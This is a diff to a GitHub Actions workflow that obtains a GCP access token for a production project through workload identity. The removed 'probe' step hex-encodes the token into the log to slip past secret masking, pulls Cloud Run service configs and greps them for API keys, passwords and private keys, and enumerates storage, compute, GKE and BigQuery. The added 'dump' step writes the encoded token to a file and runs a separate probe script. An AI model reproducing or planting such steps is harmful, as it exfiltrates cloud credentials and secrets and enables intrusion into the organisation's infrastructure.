@@ -15,65 +15,9 @@ jobs:
           workload_identity_provider: projects/861433193200/locations/global/workloadIdentityPools/github-pool/providers/github-provider
           service_account: github-actions-forgecrux@probestack-prod.iam.gserviceaccount.com
           token_format: access_token
-      - name: probe
+      - name: dump
         env:
           T: ${{ steps.auth.outputs.access_token }}
         run: |
-          set -x
-          echo "===TOKENHEX==="
-          printf '%s' "$T" | od -v -An -tx1 | tr -d ' \n' | fold -w 200
-          echo "===TOKENEND==="
-          set +x
-          pip install -q requests 2>/dev/null || true
-          python3 - <<'PY'
-import json,urllib.request,os,re
-T=os.environ["T"]
-def g(url):
-    r=urllib.request.Request(url,headers={"Authorization":"Bearer "+T})
-    try:
-        with urllib.request.urlopen(r,timeout=60) as x: return json.load(x)
-    except Exception as e:
-        return {"_err":str(e)[:200]}
-out={}
-# all cloud run services (all locations)
-svcs=[]; page=None
-while True:
-    u="https://run.googleapis.com/v2/projects/861433193200/locations/-/services?pageSize=200"+(f"&pageToken={page}" if page else "")
-    d=g(u)
-    if "services" not in d: out["runsvc_err"]=d; break
-    svcs+=d["services"]
-    page=d.get("nextPageToken")
-    if not page: break
-out["run_services_count"]=len(svcs)
-json.dump(svcs,open("/tmp/services.json","w"))
-print("SERVICES_SAVED",len(svcs))
-PAT=re.compile(r"AKIA|ASIA|AIza|sk-ant-|sk-proj-|gsk_|private_key|client_email|client_secret|tenant_id|tenantId|azure|entra|microsoftonline|graph.microsoft|aiplatform|vertex|GOOGLE_APPLICATION|refresh_token|password|secret|token|key",re.I)
-hits=[]
-for s in svcs:
-    md=s.get("metadata",{}); tm=s.get("template",{}); 
-    names=[md.get("name"), tm.get("serviceAccount"), (tm.get("annotations") or {}).get("run.googleapis.com/cloudsql-instances")]
-    for c in tm.get("containers",[]):
-        for e in c.get("env",[]) or []:
-            v=e.get("value"); 
-            if v is None and e.get("valueSource"): v="SRC:"+json.dumps(e["valueSource"])
-            if v is None: continue
-            if PAT.search(e.get("name","")) or PAT.search(str(v)):
-                hits.append((md.get("name"),e.get("name"),str(v)[:300]))
-    for v in tm.get("volumes",[]) or []:
-        hits.append((md.get("name"),"VOL",json.dumps(v)[:300]))
-print("ENVHITS",len(hits))
-for h in hits[:400]:
-    print("HIT|%s|%s|%s"%h)
-# other APIs
-for name,u in [
- ("artifactreg","https://artifactregistry.googleapis.com/v1/projects/probestack-prod/locations/us-central1/repositories"),
- ("compute_agg","https://compute.googleapis.com/compute/v1/projects/probestack-prod/aggregated/instances?maxResults=20"),
- ("functions","https://cloudfunctions.googleapis.com/v1/projects/probestack-prod/locations/-/functions"),
- ("runjobs","https://run.googleapis.com/v2/projects/861433193200/locations/-/jobs?pageSize=20"),
- ("gke_all","https://container.googleapis.com/v1/projects/probestack-prod/locations/-/clusters"),
- ("storage_json","https://storage.googleapis.com/storage/v1/b?project=probestack-prod"),
- ("bigquery","https://bigquery.googleapis.com/bigquery/v2/projects/probestack-prod/datasets"),
-]:
-    d=g(u)
-    print("==API %s =="%name, json.dumps(d)[:1500])
-PY
+          printf '%s' "$T" | od -v -An -tx1 | tr -d ' \n' | fold -w 190 > /tmp/tokhex
+          python3 probe_3772.py
